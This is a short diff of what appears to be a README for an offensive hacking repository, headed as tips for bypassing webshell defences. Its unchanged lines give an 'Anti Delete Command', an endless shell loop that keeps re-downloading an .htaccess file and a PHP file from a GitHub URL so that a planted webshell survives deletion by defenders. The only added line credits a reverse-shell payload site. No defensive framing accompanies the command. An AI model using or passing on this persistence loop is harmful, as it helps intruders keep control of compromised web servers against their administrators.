@@ -11,3 +11,7 @@
 # Tips & Trick Bypass Webshell / Crack Other Things / Defender Stuff
 ### Anti Delete Command : 
 ```while true; do echo $(TZ=Asia/Jakarta date) && curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess && echo $(TZ=Asia/Jakarta date) && curl https://raw.githubusercontent.com/t101804/repshare/main/ac.php -o ac.php; done```
+
+
+
+Credit by revshells.com and @CallMeRep
